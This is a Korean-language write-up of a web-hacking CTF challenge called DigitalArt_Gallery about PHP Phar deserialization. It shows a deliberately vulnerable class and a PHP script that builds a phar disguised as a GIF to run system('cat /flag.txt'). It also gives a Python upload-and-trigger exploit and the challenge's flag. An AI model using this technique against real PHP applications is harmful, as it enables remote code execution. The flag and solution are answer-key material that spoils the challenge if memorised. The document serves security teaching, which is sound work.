# DigitalArt_Gallery

## 출제자명
hy30nq(이현규)

## 컨셉
PHP Phar Deserialization 취약점을 활용한 웹 해킹 문제입니다. phar 파일의 메타데이터는 직렬화된 형태로 저장되며, 파일이 파싱될 때 자동으로 역직렬화가 발생합니다. 이 과정에서 `call_user_func()` 함수를 악용하여 임의 명령어를 실행할 수 있습니다.

## 문제 설명
DigitalArt Gallery는 디지털 아티스트들을 위한 온라인 전시 공간입니다. 사용자들은 GIF 형식의 디지털 아트 작품을 업로드하고 전시할 수 있으며, 큐레이터 모드에서는 작품의 메타데이터와 구조를 심층 분석할 수 있습니다.

## Writeup

### 1. 취약점 분석

`gallery.php`에서 발견되는 취약한 클래스:

```php
class ExhibitionCurator {
    public $command = 'log_exhibition';
    public $message = 'New artwork added to gallery';
    public $special_access = false;
    
    function __destruct() {
        if ($this->special_access) {
            if (function_exists($this->command)) {
                call_user_func($this->command, $this->message);
            }
        }
    }
}
```

`index.php`의 큐레이터 모드에서 `phar://` 프로토콜을 사용하여 파일 분석을 수행합니다.

### 2. 공격 벡터

1. **파일 업로드**: GIF 형식 검증을 우회하여 phar 파일 업로드
2. **큐레이터 모드**: `phar://` 프로토콜을 통한 파일 분석 활성화
3. **Deserialization**: phar 파일의 메타데이터 자동 역직렬화
4. **RCE**: `ExhibitionCurator` 클래스의 `__destruct()` 메소드에서 `call_user_func()` 악용

### 3. 익스플로잇 과정

#### 악성 Phar 파일 생성

```php
<?php
class ExhibitionCurator {
    public $command = 'system';           
    public $message = 'cat /flag.txt';    
    public $special_access = true;      
    
    function __destruct() {
        if ($this->special_access) {
            if (function_exists($this->command)) {
                call_user_func($this->command, $this->message);
            }
        }
    }
}

$phar = new Phar('malicious_artwork.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub("GIF89a\n<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(new ExhibitionCurator());
$phar->stopBuffering();

copy('malicious_artwork.phar', 'evil_art.gif');
?>
```

#### 갤러리에 업로드

웹사이트에서 다음 정보로 작품을 업로드:
- **파일**: `evil_art.gif` (위장된 phar 파일)
- **제목**: `The Abstract Reality`
- **작가**: `H4cker McPaintface`
- **큐레이터 모드**: 체크하기

#### Phar Deserialization 트리거

큐레이터 모드가 활성화되면:
1. `phar://uploads/art_xxx.gif` 경로로 파일 분석 수행
2. `file_exists()` 함수가 phar 파일을 파싱
3. 메타데이터의 `ExhibitionCurator` 객체가 역직렬화
4. `__destruct()` 메소드가 호출되어 `call_user_func('system', 'cat /flag.txt')` 실행

### 4. 자동화 스크립트

```python
#!/usr/bin/env python3
import sys
import requests
import subprocess
import re

if len(sys.argv) != 2:
    print("Usage: python3 gallery_exploit.py <target_url>")
    sys.exit(1)

target_url = sys.argv[1].rstrip('/')

# phar 파일 생성
result = subprocess.run(['php', '-d', 'phar.readonly=0', 'create_malicious_artwork.php'], 
                      capture_output=True, text=True)

if result.returncode != 0:
    print("Failed to create phar file")
    sys.exit(1)

# 익스플로잇 실행
with open('evil_art.gif', 'rb') as f:
    files = {'artwork': ('evil_art.gif', f, 'image/gif')}
    data = {
        'submit_artwork': 'upload',
        'title': 'The Abstract Reality',
        'artist': 'H4cker McPaintface',
        'curator_mode': '1'
    }
    
    response = requests.post(target_url, files=files, data=data, timeout=10)
    flag_match = re.search(r'SSD\{[^}]+\}', response.text)
    
    if flag_match:
        print(flag_match.group(0))
    else:
        print("Flag not found")
```

### 5. 플래그
```
SSD{d1g1t4l_4rt_phar_m4g1c_curAt0r_m0de}
```

### 6. 참고 자료
- https://www.hahwul.com/blog/2018/phar-php-deserialization-vulnerability/
- https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf
- https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
- https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization